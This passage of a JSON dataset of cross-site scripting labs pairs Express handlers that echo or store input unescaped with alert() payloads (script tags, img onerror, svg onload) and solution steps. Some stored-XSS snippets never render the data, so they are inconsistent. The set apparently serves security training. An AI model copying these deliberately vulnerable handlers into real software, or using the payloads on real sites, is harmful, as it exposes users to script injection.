      "<img src=x onerror=alert('Donation')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in book review site reviewer name",
    "Lab Description": "Reviewer names are reflected unsanitized on the book review page. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a review with name: <script>alert('ReviewerXSS')</script>.",
      "Observe the reflection in review summary.",
      "Test URL encoding techniques.",
      "Try variations to evade WAF.",
      "Ensure cross-browser execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const reviewer = req.body.reviewer;\n  res.send(`<p>Review by: ${reviewer}</p>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('ReviewerXSS')</script>",
      "<img src=x onerror=alert('Review')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online petition platform supporter comment",
    "Lab Description": "Supporter comments are displayed without sanitization. To solve: Inject a stored XSS payload into the comment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Sign a petition with comment: <script>alert('PetitionXSS')</script>.",
      "Check supporter comments page.",
      "Observe script execution.",
      "Fuzz the input for hidden fields.",
      "Test on mobile and desktop browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/sign-petition', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<blockquote>${comment}</blockquote>`);\n});\n\napp.listen(3000);",
    "payloads": [
      "<script>alert('PetitionXSS')</script>",
      "<img src=x onerror=alert('Petition')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in project management tool task description",
    "Lab Description": "A project management tool allows users to add task descriptions. The input is stored and rendered without sanitization. To solve: Inject a persistent XSS payload in the task description field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a task with <script>alert('TaskXSS')</script> as the description.",
      "Reload the task page and observe script execution.",
      "Test different payload variations.",
      "Use Burp Suite to confirm the payload is stored."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-task', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO tasks (description) VALUES (?)\", [description]);\n  res.send('Task created');\n});",
    "payloads": [
      "<script>alert('TaskXSS')</script>",
      "<img src=x onerror=alert('Task')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online survey form",
    "Lab Description": "An online survey form reflects user input directly in the confirmation page without sanitization. To solve: Inject a reflected XSS payload in the name field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit the survey with <script>alert('Survey')</script> in the name field.",
      "Observe script execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-survey', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Thank you, ${name}!</h1>`);\n});",
    "payloads": [
      "<script>alert('Survey')</script>",
      "<svg onload=alert('Survey')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in e-learning platform assignment feedback",
    "Lab Description": "Students can submit feedback on assignments. The input is stored and displayed without escaping, leading to stored XSS. To solve: Inject a script in the feedback section.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with <script>alert('Feedback')</script>.",
      "Observe execution on assignment review."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (text) VALUES (?)\", [feedback]);\n  res.redirect('/assignments');\n});",
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<img src=x onerror=alert('Assignment')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in blog post title",
    "Lab Description": "Blog post titles are stored without sanitization, leading to stored XSS. To solve: Submit a malicious script as the post title.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a blog post title with <script>alert('Blog')</script>.",
      "Reload the blog list page to observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO posts (title) VALUES (?)\", [title]);\n  res.send('Post created');\n});",
    "payloads": [
      "<script>alert('Blog')</script>",
      "<img src=x onerror=alert('Blog')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset form",
    "Lab Description": "The reset form reflects the user email without sanitization, allowing reflected XSS. To solve: Inject a script into the email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a reset request with email <script>alert('Reset')</script>.",
      "Observe reflected payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h2>Reset link sent to ${email}</h2>`);\n});",
    "payloads": [
      "<script>alert('Reset')</script>",
      "<img src=x onerror=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event registration comments",
    "Lab Description": "Users can leave comments on event registrations, which are stored and displayed unsanitized. To solve: Inject a persistent XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register for event with comment <script>alert('Event')</script>.",
      "Reload event details to trigger execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO event_comments (comment) VALUES (?)\", [comment]);\n  res.send('Registered');\n});",
    "payloads": [
      "<script>alert('Event')</script>",
      "<img src=x onerror=alert('Event')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in contact us form",
    "Lab Description": "The contact form reflects user message into response without encoding. To solve: Inject a script via message field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit contact form with message: <script>alert('Contact')</script>.",
      "Observe execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-us', (req, res) => {\n  const message = req.body.message;\n  res.send(`<p>Message received: ${message}</p>`);\n});",
    "payloads": [
      "<script>alert('Contact')</script>",
      "<img src=x onerror=alert('Contact')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online shop product reviews",
    "Lab Description": "Product reviews are displayed without sanitization, leading to stored XSS. To solve: Submit malicious review payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a review: <script>alert('Shop')</script>.",
      "Reload product page to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO reviews (review) VALUES (?)\", [review]);\n  res.redirect('/products');\n});",
    "payloads": [
      "<script>alert('Shop')</script>",
      "<svg/onload=alert('ReviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter signup",
    "Lab Description": "Newsletter signup reflects submitted name into response page unsanitized. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('Newsletter')</script>.",
      "Observe execution on thank you page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/newsletter-signup', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for signing up, ${name}!</p>`);\n});",
    "payloads": [
      "<script>alert('Newsletter')</script>",
      "<img src=x onerror=alert('NewsletterXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in public forum thread replies",
    "Lab Description": "Forum replies are saved and displayed without escaping, allowing stored XSS attacks. To solve: Inject XSS via reply field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a forum reply: <script>alert('Forum')</script>.",
      "View the thread and observe payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reply-thread', (req, res) => {\n  const reply = req.body.reply;\n  db.query(\"INSERT INTO forum_replies (reply) VALUES (?)\", [reply]);\n  res.redirect('/forum');\n});",
    "payloads": [
      "<script>alert('Forum')</script>",
      "<svg/onload=alert('ForumXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in internal notes section",
    "Lab Description": "An internal CRM system allows adding notes to customer profiles. These notes are rendered without sanitization. To solve: Inject a persistent XSS payload in a note field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a note containing <script>alert('Note')</script>.",
      "Reload the customer profile page to observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (content) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
    "payloads": [
      "<script>alert('Note')</script>",
      "<img src=x onerror=alert('NoteXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in job application form",
    "Lab Description": "The job application form reflects user-submitted name into the success page without encoding. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit the application with name <script>alert('Job')</script>.",
      "Observe script execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Application received, ${name}</h1>`);\n});",
    "payloads": [
      "<script>alert('Job')</script>",
      "<img src=x onerror=alert('JobXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in blog post comment section",
    "Lab Description": "Comments on blog posts are stored and displayed without proper sanitization, leading to stored XSS. To solve: Submit a malicious comment.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a comment: <script>alert('Comment')</script>.",
      "Reload blog post and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.redirect('/blog');\n});",
    "payloads": [
      "<script>alert('Comment')</script>",
      "<svg/onload=alert('CommentXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in newsletter unsubscribe page",
    "Lab Description": "When unsubscribing from the newsletter, the email field is reflected in the response without escaping, leading to reflected XSS. To solve: Inject a script via email field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit email <script>alert('Unsub')</script> on unsubscribe page.",
      "Observe execution on the response page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/unsubscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Unsubscribed: ${email}</p>`);\n});",
    "payloads": [
      "<script>alert('Unsub')</script>",
      "<img src=x onerror=alert('UnsubscribeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in portfolio project descriptions",
    "Lab Description": "Users can create portfolios by adding project descriptions. These descriptions are rendered without validation. To solve: Inject a stored XSS payload.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a portfolio project with <script>alert('Portfolio')</script>.",
      "Reload portfolio to trigger execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-project', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO projects (description) VALUES (?)\", [description]);\n  res.send('Project added');\n});",
    "payloads": [
      "<script>alert('Portfolio')</script>",
      "<img src=x onerror=alert('PortfolioXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in event registration confirmation",
    "Lab Description": "When registering for events, user input is reflected into the confirmation page without escaping. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Register for event with name: <script>alert('Event')</script>.",
      "Observe script execution after registration."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register', (req, res) => {\n  const attendee = req.body.attendee;\n  res.send(`<h2>Thanks for registering, ${attendee}</h2>`);\n});",
    "payloads": [
      "<script>alert('Event')</script>",
      "<svg/onload=alert('EventXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in FAQ question submission",
    "Lab Description": "Users can submit questions for the FAQ section, but input is saved and rendered without validation. To solve: Inject stored XSS via question field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a question <script>alert('FAQ')</script>.",
      "View FAQ page and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-faq', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO faqs (question) VALUES (?)\", [question]);\n  res.redirect('/faq');\n});",
    "payloads": [
      "<script>alert('FAQ')</script>",
      "<img src=x onerror=alert('FAQXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in site feedback form",
    "Lab Description": "Feedback form reflects submitted text into a confirmation page unsanitized. To solve: Inject a reflected XSS payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback: <script>alert('Feedback')</script>.",
      "Observe execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<p>Your feedback: ${feedback}</p>`);\n});",
    "payloads": [
      "<script>alert('Feedback')</script>",
      "<svg/onload=alert('FeedbackXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in bug report description",
    "Lab Description": "Bug report descriptions are stored and rendered without escaping, leading to stored XSS vulnerabilities. To solve: Inject a script via bug description field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Report a bug with description <script>alert('Bug')</script>.",
      "Reload admin bug review page to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO bugs (description) VALUES (?)\", [description]);\n  res.send('Bug reported');\n});",
    "payloads": [
      "<script>alert('Bug')</script>",
      "<img src=x onerror=alert('BugXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in login error message",
    "Lab Description": "Incorrect login attempts reflect user input into an error message unsanitized, enabling reflected XSS. To solve: Inject a script via username field.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Attempt login with username <script>alert('Login')</script>.",
      "Observe error page executing the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  res.send(`<p>Login failed for ${username}</p>`);\n});",
    "payloads": [
      "<script>alert('Login')</script>",
      "<svg/onload=alert('LoginXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user profile status message",
    "Lab Description": "Users can set a status message on their profile, but the input is stored and rendered without sanitization, allowing stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set status message to <script>alert('StatusXSS')</script>.",
      "Reload the profile page and observe script execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-status', (req, res) => {\n  const status = req.body.status;\n  db.query(\"UPDATE users SET status = ? WHERE id = ?\", [status, req.user.id]);\n  res.send('Status updated');\n});",
    "payloads": [
      "<script>alert('StatusXSS')</script>",
      "<img src=x onerror=alert('Status')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in password reset form",
    "Lab Description": "The password reset page reflects the email address back into the page without proper escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit email <script>alert('ResetXSS')</script>.",
      "Observe payload execution on the reset confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to: ${email}</p>`);\n});",
    "payloads": [
      "<script>alert('ResetXSS')</script>",
      "<svg/onload=alert('Reset')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in customer feedback form",
    "Lab Description": "Feedback submitted through the customer feedback form is stored in the database and displayed without escaping, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback <script>alert('FeedbackXSS')</script>.",
      "Check the admin panel where feedback is listed."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (content) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
    "payloads": [
      "<script>alert('FeedbackXSS')</script>",
      "<img src=x onerror=alert('FeedbackXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in report abuse form",
    "Lab Description": "User-submitted report messages are reflected back without sanitization, enabling reflected XSS attacks.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit abuse report with message <script>alert('Abuse')</script>.",
      "Observe execution on the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-abuse', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>Report submitted: ${message}</div>`);\n});",
    "payloads": [
      "<script>alert('Abuse')</script>",
      "<svg/onload=alert('Abuse')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in conference submission abstracts",
    "Lab Description": "Abstracts submitted for a conference are stored and displayed without sanitization, leading to persistent XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an abstract containing <script>alert('Conference')</script>.",
      "View abstract listing to trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-abstract', (req, res) => {\n  const abstract = req.body.abstract;\n  db.query(\"INSERT INTO abstracts (content) VALUES (?)\", [abstract]);\n  res.send('Abstract submitted');\n});",
    "payloads": [
      "<script>alert('Conference')</script>",
      "<img src=x onerror=alert('ConfXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in online booking system",
    "Lab Description": "The booking confirmation page reflects user-submitted input without escaping, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Book with a name: <script>alert('Booking')</script>.",
      "Observe script execution in the confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Booking confirmed for: ${name}</h3>`);\n});",
    "payloads": [
      "<script>alert('Booking')</script>",
      "<svg/onload=alert('BookingXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in product question and answer section",
    "Lab Description": "Users can submit questions on product pages, but these are displayed unsanitized, leading to stored XSS vulnerabilities.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a question: <script>alert('ProductQA')</script>.",
      "Reload product page and observe payload execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO questions (content) VALUES (?)\", [question]);\n  res.send('Question submitted');\n});",
    "payloads": [
      "<script>alert('ProductQA')</script>",
      "<img src=x onerror=alert('QuestionXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in contact us form",
    "Lab Description": "The contact us form reflects the name field back in the response page without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit name: <script>alert('Contact')</script>.",
      "Observe execution on the thank you page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for contacting us, ${name}</p>`);\n});",
    "payloads": [
      "<script>alert('Contact')</script>",
      "<svg/onload=alert('ContactXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in support ticket messages",
    "Lab Description": "Support ticket messages are stored unsanitized and displayed to admins, leading to stored XSS vulnerabilities.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a ticket message: <script>alert('SupportTicket')</script>.",
      "Login as admin and view the ticket."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO tickets (message) VALUES (?)\", [message]);\n  res.send('Ticket submitted');\n});",
    "payloads": [
      "<script>alert('SupportTicket')</script>",
      "<img src=x onerror=alert('SupportXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in feedback preview page",
    "Lab Description": "The feedback preview page reflects the feedback text input without proper encoding, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit feedback <script>alert('Preview')</script>.",
      "Observe immediate payload execution in the preview."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>Preview: ${feedback}</div>`);\n});",
    "payloads": [
      "<script>alert('Preview')</script>",
      "<svg/onload=alert('PreviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in event management platform guest notes",
    "Lab Description": "Guests can leave notes when registering for events. The notes are rendered without sanitization, leading to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a note with <script>alert('EventGuest')</script>.",
      "View the event dashboard and trigger XSS."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO guests (note) VALUES (?)\", [note]);\n  res.send('Registration complete');\n});",
    "payloads": [
      "<script>alert('EventGuest')</script>",
      "<img src=x onerror=alert('EventNote')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in product return form",
    "Lab Description": "The return request form reflects user comments directly into the page without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a comment with <script>alert('ReturnXSS')</script>.",
      "Observe script execution in return confirmation page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-return', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>Return comment: ${comment}</div>`);\n});",
    "payloads": [
      "<script>alert('ReturnXSS')</script>",
      "<svg/onload=alert('Return')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in online newspaper comment section",
    "Lab Description": "Reader comments on articles are stored unsanitized, leading to persistent XSS vulnerabilities.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a comment: <script>alert('NewsXSS')</script>.",
      "View the article page to trigger payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
    "payloads": [
      "<script>alert('NewsXSS')</script>",
      "<img src=x onerror=alert('CommentXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in support live chat pre-form",
    "Lab Description": "The support chat pre-form echoes back the name field without sanitization, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Enter name <script>alert('ChatXSS')</script> into chat pre-form.",
      "See execution on welcome page."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/chat-start', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Welcome ${name}</p>`);\n});",
    "payloads": [
      "<script>alert('ChatXSS')</script>",
      "<svg/onload=alert('ChatWelcome')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in e-commerce wishlist notes",
    "Lab Description": "Users can add notes to wishlist items. These notes are stored without validation, allowing stored XSS attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Add note <script>alert('Wishlist')</script>.",
      "View wishlist page and observe execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-wishlist-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"UPDATE wishlist SET note = ? WHERE user_id = ?\", [note, req.user.id]);\n  res.send('Note added to wishlist');\n});",
    "payloads": [
      "<script>alert('Wishlist')</script>",
      "<img src=x onerror=alert('WishlistXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in job application portal cover letter",
    "Lab Description": "The job application form reflects cover letters without sanitization during preview, causing reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Paste <script>alert('CoverXSS')</script> into cover letter.",
      "Observe payload execution during preview."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-cover', (req, res) => {\n  const coverLetter = req.body.cover;\n  res.send(`<div>Cover Letter Preview: ${coverLetter}</div>`);\n});",
    "payloads": [
      "<script>alert('CoverXSS')</script>",
      "<svg/onload=alert('Cover')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in university course review system",
    "Lab Description": "Students submit course reviews, but reviews are stored without sanitization, enabling stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit course review: <script>alert('CourseXSS')</script>.",
      "View course page and observe the execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO course_reviews (content) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
    "payloads": [
      "<script>alert('CourseXSS')</script>",
      "<img src=x onerror=alert('ReviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in event RSVP form",
    "Lab Description": "The RSVP form for events reflects user name without encoding, leading to reflected XSS.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit RSVP with name: <script>alert('RSVPXSS')</script>.",
      "Check if the page renders and executes the payload."
    ],
    "Vulnerability name": "Cross-site scripting",
